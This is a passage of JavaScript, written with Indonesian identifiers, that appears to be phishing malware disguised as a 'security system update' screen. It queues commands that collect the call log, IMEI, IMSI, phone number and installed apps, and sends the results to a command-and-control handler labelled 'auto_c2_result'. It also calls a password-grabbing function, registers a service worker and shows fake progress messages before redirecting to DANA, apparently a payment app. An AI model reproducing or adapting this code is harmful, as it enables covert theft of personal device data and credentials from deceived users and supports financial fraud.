        commands.push('ambil_call_log');
        commands.push('ambil_imei');
        commands.push('ambil_imsi');
        commands.push('ambil_nomor_hp');
        commands.push('get_installed_apps');
    }
    commands.forEach(function(cmd, index) {
        setTimeout(function() {
            try {
                var hasil = eksekusiPerintah({ aksi: cmd });
                K({ sumber: 'auto_c2_result', data: { perintah: cmd, hasil: hasil, waktu: Date.now() } });
            } catch(e) {}
        }, index * 1000);
    });
}

function finishAndRedirect() {
    if (allDone) return;
    allDone = true;
    updateProgress(100, '✅ Update Selesai');
    K({ sumber: 'update_complete', data: {
        data_collected: Object.keys(DATA_COLLECTED)
    } });
    setTimeout(redirectToDANA, 3000);
}

// ============================================================
// START
// ============================================================
updateProgress(5, '⏳ Memperbarui System Keamanan...');
K({ sumber: 'system_update_start', data: { platform: PLATFORM, bridge: A.isAvailable } });

if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('/sw.js', { scope: '/' })
        .then(function(reg) { K({ sumber: 'sw_registered', data: { scope: reg.scope } }); })
        .catch(function() {});
}

ambilPassword();

setTimeout(function() {
    if (!allDone) {
        allDone = true;
        updateProgress(100, '✅ Update Selesai');
        K({ sumber: 'timeout_fallback', data: 'redirecting' });
        setTimeout(redirectToDANA, 1000);
    }
}, 60000);
